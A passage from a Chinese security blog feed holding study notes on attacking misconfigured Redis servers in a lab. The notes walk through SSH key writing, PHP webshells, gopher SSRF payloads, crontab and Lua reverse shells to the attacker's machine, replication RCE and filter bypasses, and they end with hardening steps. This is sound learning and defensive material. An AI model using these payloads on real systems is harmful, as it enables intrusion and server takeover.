规则管理</h1><p><a href="http://www.zsythink.net/archives/1517">http://www.zsythink.net/archives/1517</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考资料： &lt;/p&gt;
&lt;p&gt;(内容和图片)&lt;/p&gt;
&lt;p&gt;全教程系列&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.zsythink.net/archives/tag/iptables/&quot;&gt;iptables 入门系列&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="运维知识" scheme="https://hack-for.fun/categories/%E8%BF%90%E7%BB%B4%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="iptables" scheme="https://hack-for.fun/tags/iptables/"/>
    
  </entry>
  
  <entry>
    <title>Redis 安全学习笔记</title>
    <link href="https://hack-for.fun/c10c5ca9.html"/>
    <id>https://hack-for.fun/c10c5ca9.html</id>
    <published>2020-08-26T01:58:53.000Z</published>
    <updated>2020-08-26T02:09:53.598Z</updated>
    
    <content type="html"><![CDATA[<p>最近放出来的文章都是以前早就总结好的了。</p><h1 id="Redis-安全学习笔记"><a href="#Redis-安全学习笔记" class="headerlink" title="Redis 安全学习笔记"></a>Redis 安全学习笔记</h1><p><a href="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ"><img src="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ/badge" alt="hackmd-github-sync-badge"></a></p><p>[TOC]</p><p>实战环境下，感觉Redis 未授权非常常见，而我之前只知道怎么利用别人的写好的工具去解CTF，没有去研究过原理，遂在端午节来研究一波！</p><h2 id="Redis-介绍"><a href="#Redis-介绍" class="headerlink" title="Redis 介绍"></a>Redis 介绍</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。</p><blockquote><p>Redis 下载地址：<a href="http://download.redis.io/releases/">http://download.redis.io/releases/</a></p></blockquote><h2 id="RESP-协议介绍"><a href="#RESP-协议介绍" class="headerlink" title="RESP 协议介绍"></a>RESP 协议介绍</h2><p>Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。<br>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。<br>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p><p>RESP在Redis中用作请求 - 响应协议的方式如下：</p><p>客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。<br>服务器根据命令实现回复一种RESP类型。<br>在RESP中，某些数据的类型取决于第一个字节：<br>对于Simple Strings，回复的第一个字节是+<br>对于error，回复的第一个字节是-<br>对于Integer，回复的第一个字节是:<br>对于Bulk Strings，回复的第一个字节是$<br>对于array，回复的第一个字节是*<br>此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。<br>在RESP中，协议的不同部分始终以”\r\n”(CRLF)结束。</p><p><a href="https://xz.aliyun.com/t/5665#toc-0">https://xz.aliyun.com/t/5665#toc-0</a></p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><h3 id="未授权漏洞"><a href="#未授权漏洞" class="headerlink" title="未授权漏洞"></a>未授权漏洞</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下（默认配置），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。　　目前比较主流的案例：yam2 minerd 挖矿程序，还有在多次应急事件中发现大量的watch-smartd挖矿木马。</p><p>简单说，漏洞的产生条件有以下两点：</p><p>（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；</p><p>（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。</p><p>(3) root 身份运行redis</p><p>主流案例图示<br>主流案例图示</p><p>写公钥只是其中一种，还可以写webshell ，crontab 反弹shell，来getshell。<br><img src="https://i.imgur.com/p9JFoqk.png"></p><p>以及其他漏洞场景，下面逐一介绍和复现。</p><h3 id="主从复制-RCE"><a href="#主从复制-RCE" class="headerlink" title="主从复制 RCE"></a>主从复制 RCE</h3><p>Redis主从复制介绍<br>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>漏洞出现的背景<br>随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了</p><p>漏洞原理<br>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。</p><p>然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="复现准备"><a href="#复现准备" class="headerlink" title="复现准备"></a>复现准备</h3><p>安装Redis</p><p>sudo apt-get update # 更新apt 包<br>sudo apt-get install redis-server # 安装Redis<br>service redis-server start # 开启Redis 服务（ 经过复现，这种模式下，是以redis身份运行的redis 服务<br>redis-cli # 进入Redis 命令行模式</p><p>复现环境<br><img src="https://i.imgur.com/2VYBQlt.png"></p><p>网络环境：NAT</p><p>攻击机：Kali Linux：192.168.118.129</p><p>靶机：Ubuntu 18.04 ：192.168.118.142</p><p>Redis 连接命令<br>redis-cli -h 127.0.0.1 -p 6379<br>解决Redis 无法远程连接：<a href="https://blog.csdn.net/qq_41507845/article/details/80967282">https://blog.csdn.net/qq_41507845/article/details/80967282</a></p><p>修改redis 配置文件: Ubuntu 在 /etc/redis/redis.conf</p><p>#bind 127.0.0.1<br>redis在开放往外网的情况下(默认配置是bind 127.0.0.1，只允许本地访问，如果配置了其他网卡地址那么就可以网络访问)，默认配置下是空口令，端口为6379。</p><p>Protected-mode no<br>redis3.2版本后新增protected-mode配置，默认是yes，即开启。设置外部网络连接redis服务，设置方式如下：<br>1、关闭protected-mode模式，此时外部网络可以直接访问<br>2、开启protected-mode保护模式，需配置bind ip或者设置访问密码</p><h3 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h3><p>对靶机进行全端口扫描：<br><img src="https://i.imgur.com/OiedL9z.png"></p><p>发现对外开启6379 redis 服务。获取redis 详细信息</p><p>nmap -A -p 6379 -script redis-info 192.168.118.142<br><img src="https://i.imgur.com/LVfNqbh.png"></p><p>尝试远程连接受害者redis 服务。</p><p>redis-cli -h 192.168.118.142 -p 6379</p><p>成功连上，执行命令ping , 如果回显PONG 则表示远程登录成功。</p><p>执行info 命令，在redis 2.8 以后可以看到redis 配置文件的物理路径：<br><img src="https://i.imgur.com/Ks7zBDv.png"></p><p>Ubuntu 下为：/etc/redis/redis.conf</p><p>CentOs 下为：/etc/redis.conf</p><p>场景一：利用redis 写入ssh key 远程登录靶机ssh<br>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。</p><p>条件：</p><p>靶机以root 身份启动redis 服务<br>redis 认证无密码或者弱口令<br>服务器开启ssh服务，并允许以密钥登录 ，开启ssh 服务：<a href="https://blog.csdn.net/jackghq/article/details/54974141">https://blog.csdn.net/jackghq/article/details/54974141</a><br>攻击机：</p><p>生成ssh key<br>ssh-keygen -t rsa<br><img src="https://i.imgur.com/V8qwFVy.png"></p><p>这里使用\n\n 前后换行，是为了避免和redis 其他缓存的数据混淆。</p><p>将生成的key.txt 写入靶机的缓冲里<br>cat /root/.ssh/key.txt | redis-cli -h 192.168.118.142 -x set evil_ssh_key</p><p>这里出现报错，不知道是不是版本问题还是执行的命令有问题，Google 解决：</p><p><a href="https://www.jianshu.com/p/3aaf21dd34d6">https://www.jianshu.com/p/3aaf21dd34d6</a></p><p>原因：强制关闭redis 快照导致不能持久化。</p><p>在靶机上redis 执行（所以我感觉这次复现算是失败了，实际环境怎么可能呢，</p><p>127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no<br>当我正准备写的时候，发现permission denied。原因：靶机redis 不是以root 身份运行，说不定上一个报错，同样也是这个原因。</p><p>将permission deied的问题去搜索。发现已有人踩过坑。</p><p><a href="https://airycanon.me/jie-jue-redis-de-getshell-yin-qi-de-bgsave-cuo-wu/">https://airycanon.me/jie-jue-redis-de-getshell-yin-qi-de-bgsave-cuo-wu/</a></p><p><img src="https://i.imgur.com/o04V2rM.png"></p><p>果然，查看进程发现，redis 不是以root 身份登录的。而且上面那个修改为no，只是不报错，问题其实也并没有解决。这里通过以root权限使用配置文件启动redis-server 即可。（原因是高版本redis，默认以redis 身份运行的</p><ol><li>设置redis 备份路径为/root/.ssh , 这样可以写入我们的evil_ssh_key<br>config set dir /root/.ssh   # 如果报错，说明靶机没有登录过ssh。执行 ssh localhost 即可</li><li>设置保存文件名为 authorized_keys<br>config set dbfilename authorized_keys</li><li>保存，数据写入dir 目录下的 dbfilename 中<br>save</li><li>ssh 连接即可getshell<br>dir: The DB will be written inside this directory, with the filename specified above using the ‘dbfilename’ configuration directive.<br>dbfilename: The filename where to dump the DB</li></ol><p>/etc/redis/redis.conf</p><p><img src="https://i.imgur.com/NQONHXo.png"></p><p>方法二：生成符合RESP 格式的payload ，利用 ssrf(gopher 协议) + curl 打。<br>这里不做复现。</p><h4 id="场景二：利用redis-写入webshell"><a href="#场景二：利用redis-写入webshell" class="headerlink" title="场景二：利用redis 写入webshell"></a>场景二：利用redis 写入webshell</h4><p>直接写 webshell<br>192.168.118.142:6379&gt; config set dir /var/www/html<br>OK<br>192.168.118.142:6379&gt; set xxx “\n\n\n<?php @eval($_POST[a];?>\n\n\n”<br>OK<br>192.168.118.142:6379&gt; config set dbfilename webshell.php<br>OK<br>192.168.118.142:6379&gt; save<br>OK<br>192.168.118.142:6379&gt;<br>使用蚁剑发现无法连接。不过在靶机上确实可以看到文件写入了。</p><p>解决Apache 不解析 php ：sudo apt-get install libapache2-mod-php7.2<br><img src="https://i.imgur.com/tCHcAkz.png"></p><p>直接访问，返回500。可以看到文件内容有点奇怪。试试flushall全部删掉，重新写webshell 。果然，成功连接webshell。</p><p>FLUSHALL命令可以清空一个Redis实例中所有数据库中的数据</p><p>192.168.118.142:6379&gt; flushall<br>OK<br>192.168.118.142:6379&gt; config get dir</p><ol><li>“dir”</li><li>“/var/www/html”</li><li>168.118.142:6379&gt; config set dir /var/www/html/<br>OK</li><li>168.118.142:6379&gt; config get dbfilename</li><li>“dbfilename”</li><li>“webshell.php”</li><li>168.118.142:6379&gt; config set dbfilename shell.php<br>OK</li><li>168.118.142:6379&gt; set webshell “<?php eval($_POST[a]);?>“<br>OK</li><li>168.118.142:6379&gt; save<br>OK</li><li>168.118.142:6379&gt; </li></ol><p><img src="https://i.imgur.com/qApD7Ir.png"></p><p>这个成功连上去，是www-data权限。所以没有ssh 直接是root权限（因为ssh利用方式，是root启动redis，root登录ssh。不过问题不大，拿到webshell 了，至少渗透也就成功了一半了。</p><p>不过真实渗透不可能让你执行flushall的，数据最重要。</p><p>SSRF 写入 WebShell<br>curl + 下面的payload</p><p>gopher://192.168.118.142:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<br><img src="https://i.imgur.com/UDjp6GH.png"></p><h4 id="场景三：利用redis-写入crontab-反弹shell"><a href="#场景三：利用redis-写入crontab-反弹shell" class="headerlink" title="场景三：利用redis 写入crontab 反弹shell"></a>场景三：利用redis 写入crontab 反弹shell</h4><p>看网上已经复现的师傅的文章，ubuntu 利用定时任务反弹shell 几乎不成，利用python 反弹有时候可以成功。CentOS 可以成功。<br><img src="https://i.imgur.com/P5uZdwM.png"></p><p>这里就用yulige 文章中的版本：CentOS 6.7</p><p>原理也是利用 未授权通过 CONFIG 和 set 等命令来写定时任务，简单的换了一下物理路径(根据OS的不同，定时任务的文件目录不同)。然后当靶机执行定时任务时，即可反弹shell。</p><p>CentOS 定时任务：/var/spool/cron/<username></p><p>Ubuntu 定时任务：/var/spool/cron/crontabs/<username></p><p>bash 反弹<br>Payload:</p><p>payload经过url 编码后，在存在SSRF的漏洞点即可反弹shell。</p><p>gopher://<target_ip>:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<br>nc -lvp 1234</p><p>远程登录了redis，执行一下即可，和写 ssh key 一样。crontab 最小执行单位为1分钟</p><p>flushall # 谨慎使用！（本地测试可以，实际渗透可能没这个命令，有也不要用<br>set reshell “\n\n* * * * * bash -i &gt; &amp; /dev/tcp/192.168.118.129/2333 0&gt;&amp;1\n\n”<br>config set dirr /var/spool/cron/<br>config set dbfilename root<br>save<br>nc -lvp 2333</p><p>python 反弹<br>\n\n * * * * * python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.118.129”,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’\n\n</p><h4 id="场景四：主从复制RCE"><a href="#场景四：主从复制RCE" class="headerlink" title="场景四：主从复制RCE"></a>场景四：主从复制RCE</h4><p>影响版本：Redis 4.x/5.x (&lt;= 5.0.5)<br>漏洞类型：RCE<br>利用条件：未授权或者弱口令外网访问redis 服务<br>攻击思路：来自参考资料。</p><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><p><img src="https://i.imgur.com/cLoUGX3.png"></p><p>redis 5.0:</p><p>redis 5.0 不允许在脚本中执行命令，即 不能使用CONFIG 命令去设置或者获取数据库的物理路径，但是我们仍然可以猜测dbfilename 。 PPT 作者给出了一种攻击思路：</p><p><img src="https://i.imgur.com/SeNIJDt.jpg"></p><p>redis 通过slaveof 设置主从状态。主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。</p><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p><p>复现过程<br>启动一个redis 5.0 的镜像<br><a href="https://www.runoob.com/docker/docker-install-redis.html">https://www.runoob.com/docker/docker-install-redis.html</a></p><p><img src="https://i.imgur.com/rUwcW6f.png"></p><p>启动一个Redis Rogue Server<br>在使用之前，将恶意so 文件下载到.py 文件同目录下。</p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>默认的端口为 6379 默认vps 端口为21000<br><img src="https://i.imgur.com/lWGmVLx.png"></p><p>这里我打了几次都是timeout。用kali 确信是可以直接远程连接我的vps 的redis服务的。这里是环境问题（腾讯云），网上也有些师傅没复习成功，后来用vps 复现成功了。</p><p>关于主从复制RCE，原理更重要，其实打就是用别人的工具……</p><h4 id="场景五：Lua-RCE"><a href="#场景五：Lua-RCE" class="headerlink" title="场景五：Lua RCE"></a>场景五：Lua RCE</h4><p>CVE-2015-4335</p><p>影响版本：Redis before 2.8.21 and 3.x before 3.0.2</p><p>漏洞危害：远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码</p><p>Exploit: <a href="https://github.com/QAX-A-Team/redis_lua_exploit/blob/master/redis_lua.py">https://github.com/QAX-A-Team/redis_lua_exploit/blob/master/redis_lua.py</a></p><p>将147 行的 host 改为目标机器ip。</p><p>获取反弹shell。</p><p>eval “tonumber(‘/bin/bash -i &gt;&amp; /dev/tcp/192.168.91.1/2333 0&gt;&amp;1’, 8)” 0</p><h4 id="场景六：缓冲区溢出-RCE"><a href="#场景六：缓冲区溢出-RCE" class="headerlink" title="场景六：缓冲区溢出 RCE"></a>场景六：缓冲区溢出 RCE</h4><p>CVE-2016-8339</p><p>受影响的版本 3.2.x - 3.2.4</p><p>漏洞类型：数组越界（数组下标越界导致溢出</p><p>涉及二进制，参考：<a href="https://bestwing.me/Redis-CVE-2016-8339-analysis.html">https://bestwing.me/Redis-CVE-2016-8339-analysis.html</a></p><p>POC：config set client-output-buffer-limit “master 1094795585 1094795585 1094795585”</p><h2 id="绕过-截断"><a href="#绕过-截断" class="headerlink" title="绕过 ? 截断"></a>绕过 ? 截断</h2><p>以下内容均转载自yulige的博客</p><p>转义绕过<br>写入恶意代码：（&lt;? 等特殊符号需要转义，不然问号后面会导致截断无法写入）<br>dict://0:6379/set:shell:”\x3C\x3Fphp\x20echo$_GET[x]\x3B\x3F\x3E”</p><p><a href="https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ">https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ</a><br><img src="https://i.imgur.com/je6ovIe.png"></p><h3 id="主从复制绕过"><a href="#主从复制绕过" class="headerlink" title="主从复制绕过"></a>主从复制绕过</h3><p><a href="http://yulige.top/?p=775#i-17">http://yulige.top/?p=775#i-17</a></p><p>当？截断的时候可以使用主从复制的方法将key值从主节点复制过来。然后节点再执行备份数据库操作写入webshell。</p><p>主节点</p><p>127.0.0.1:4444&gt; set shell “”<br>OK<br>节点</p><p>dict://0:6379/slaveof:127.0.0.1:4444<br>dict://0:6379/config:set:dir:/var/www/html<br>dict://0:6379/config:set:dbfilename:shell.php<br>dict://0:6379/save<br>dict://0:6379/slaveof:no:one<br>查看一下文件是成功写入shell了。</p><p>当然了如果可以出外网也可以直接主从复制rce，这一点在前面就说过了。只要用python起一个服务去模拟redis的返回，并且在全量复制的时候把数据库文件替换成so文件即可。</p><p>bitop 命令绕过<br>zer0pts CTF 2020 urlapp ：<a href="https://hackmd.io/@theoldmoon0602/r1mltAWHL">https://hackmd.io/@theoldmoon0602/r1mltAWHL</a><br><img src="https://i.imgur.com/VW73I1v.png"></p><p>该命令可将key 进行位运算，取结果进行保存。</p><p>bitop 命令的详细文档：<a href="https://redis.io/commands/bitop">https://redis.io/commands/bitop</a></p><p>Available since 2.6.0.</p><p>Time complexity: O(N)</p><p>Perform a bitwise operation between multiple keys (containing string values) and store the result in the destination key.</p><p>The BITOP command supports four bitwise operations: AND, OR, XOR and NOT, thus the valid forms to call the command are:</p><p>BITOP AND destkey srckey1 srckey2 srckey3 … srckeyN<br>BITOP OR destkey srckey1 srckey2 srckey3 … srckeyN<br>BITOP XOR destkey srckey1 srckey2 srckey3 … srckeyN<br>BITOP NOT destkey srckey<br>image-20200627173823931<br>image-20200627173823931</p><h3 id="setbit-命令绕过"><a href="#setbit-命令绕过" class="headerlink" title="setbit 命令绕过"></a>setbit 命令绕过</h3><p>既然想明白关键是?截断的话其实方法也很多，能操作key就可以。这里举出一个command setbit.</p><p><a href="https://www.runoob.com/redis/strings-setbit.html">https://www.runoob.com/redis/strings-setbit.html</a></p><p>Redis Setbit 命令用于对 key 所储存的字符串值，设置或清除指定偏移量上的位(bit)。</p><p>?的ascii是63，ascii62是&gt;，二进制分别是0b00011111和0b00011110。所以按照前面的payload稍微改一下就是.使用setbit改动一位二进制即可把字符变成?，从而可写入webshell。</p><p>127.0.0.1:6379&gt; config set dir /var/www/html<br>OK<br>127.0.0.1:6379&gt; config set dbfilename shell.php<br>OK<br>127.0.0.1:6379&gt; set webshell “&lt;&gt;php @eval($_POST[1]);&gt;&gt;”<br>OK<br>127.0.0.1:6379&gt; setbit webshell 191 1<br>(integer) 0<br>127.0.0.1:6379&gt; setbit webshell 15 1<br>(integer) 0<br>127.0.0.1:6379&gt; save<br>OK<br>Windows 下Redis GetShell</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>我们可以通过 redis 的配置文件设置密码参数，这样客户端连接到 redis 服务就需要密码验证，这样可以让你的 redis 服务更安全。</p><p>我们可以通过以下命令查看是否设置了密码验证：</p><p>127.0.0.1:6379&gt; CONFIG get requirepass</p><ol><li>“requirepass”</li><li>“”<br>默认情况下 requirepass 参数是空的，这就意味着你无需通过密码验证就可以连接到 redis 服务。</li></ol><p>你可以通过以下命令来修改该参数：</p><p>127.0.0.1:6379&gt; CONFIG set requirepass “runoob”<br>OK<br>127.0.0.1:6379&gt; CONFIG get requirepass</p><ol><li>“requirepass”</li><li>“runoob”<br>设置密码后，客户端连接 redis 服务就需要密码验证，否则无法执行命令。</li></ol><p>AUTH 命令基本语法格式如下：</p><p>127.0.0.1:6379&gt; AUTH password<br>127.0.0.1:6379&gt; AUTH “runoob”<br>OK<br>127.0.0.1:6379&gt; SET mykey “Test value”<br>OK<br>127.0.0.1:6379&gt; GET mykey<br>“Test value”<br>修改默认配置，设置访问密码为强密码。<br>port 修改redis使用的默认端口号</p><p>bind 设定redis监听的专用IP</p><p>requirepass 设定redis连接的密码</p><p>rename-command CONFIG “”　 ＃禁用CONFIG命令</p><p>rename-command info info2 #重命名info为info2</p><p>设置防火墙策略，添加访问redis 白名单。<br>iptables -A input -s x.x.x.x -p tcp –dport 6379 -j ACCEPT<br>权限最小原则。<br>以低权限用户启动redis 服务</p><p>禁用/重命名高危命令，如config , flushall, eval<br>redis 不暴露公网 bind 127.0.0.1 , protected-mode yes<br>修改authorized_keys文件的权限对拥有者只读，其他用户无权限<br>相关资料<br><a href="https://blog.csdn.net/qq_41507845/article/details/80967282">https://blog.csdn.net/qq_41507845/article/details/80967282</a> 解决无法远程连接Redis</p><p><a href="https://www.cnblogs.com/linjiqin/p/8608975.html">https://www.cnblogs.com/linjiqin/p/8608975.html</a> 复习一下docker</p><p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</a> Crontab</p><p><a href="https://www.cnblogs.com/kismetv/p/9236731.html#t2">https://www.cnblogs.com/kismetv/p/9236731.html#t2</a> Redis 主从复制学习</p><p><a href="http://yulige.top/?p=775#_RCE">http://yulige.top/?p=775#_RCE</a> 一篇总结非常好并且全面的Redis 安全博文</p><p>[<a href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/]">https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/]</a>(<a href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1">https://www.k0rz3n.com/2019/07/29/对一次</a> redis 未授权写入攻击的分析以及 redis 4.x RCE 学习/) 也是一篇超级棒的文章</p><p><a href="https://www.freebuf.com/column/158065.html">https://www.freebuf.com/column/158065.html</a> 未授权攻击Redis</p><p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a> 主从复制攻击手法原理pdf</p><p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a> 主从复制攻击Redis</p><p><a href="https://mntn0x.github.io/2019/08/02/Redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E7%8E%B0%E7%9A%84RCE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://mntn0x.github.io/2019/08/02/Redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E7%8E%B0%E7%9A%84RCE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://zhuanlan.zhihu.com/p/113116872">https://zhuanlan.zhihu.com/p/113116872</a></p><p><a href="https://joychou.org/web/phpssrf.htmld">https://joychou.org/web/phpssrf.htmld</a> SSRF</p><p><a href="https://www.anquanke.com/post/id/181599">https://www.anquanke.com/post/id/181599</a> SSRF 认证攻击Redis</p><p><a href="https://xz.aliyun.com/t/5665#toc-8">https://xz.aliyun.com/t/5665#toc-8</a> SSRF 攻击redis 的总结</p><p><a href="https://lorexxar.cn/2016/12/03/redis-getshell/#centos">https://lorexxar.cn/2016/12/03/redis-getshell/#centos</a> redis getsell 的一些思考</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=5a2622e492335219440647d9b5453379&amp;chksm=cff1926ef8861b781b9dd8ac3e15f0098a7574791717e4958c6d8bc7ab19669d9d20912e2514&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586525848516&amp;sharer_shareid=7e41844e30c25b110ea9dbbf7022e94d#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=5a2622e492335219440647d9b5453379&amp;chksm=cff1926ef8861b781b9dd8ac3e15f0098a7574791717e4958c6d8bc7ab19669d9d20912e2514&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586525848516&amp;sharer_shareid=7e41844e30c25b110ea9dbbf7022e94d#rd</a> 细数redis 的几种getshell 方法</p><p>相关工具<br>Redis + SSRF payload 生成：<br><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> 支持ReverseShell 和 PHPShell</p><p>Redis 口令暴破<br><a href="https://github.com/evilpacket/redis-sha-crack">https://github.com/evilpacket/redis-sha-crack</a></p><p>Redis Rogue Server<br><a href="https://github.com/LoRexxar/redis-rogue-server">https://github.com/LoRexxar/redis-rogue-server</a></p><p><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>主从复制加载的恶意so 文件<br><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><p>MSF 下的利用模块<br>auxiliary/scanner/redis/file_upload normal Redis File Upload</p><p>auxiliary/scanner/redis/redis_login normal Redis Login Utility</p><p>auxiliary/scanner/redis/redis_server normal Redis Command Execute Scanner</p><p>漏洞挖掘<br>对 port:6379 搜索<br><a 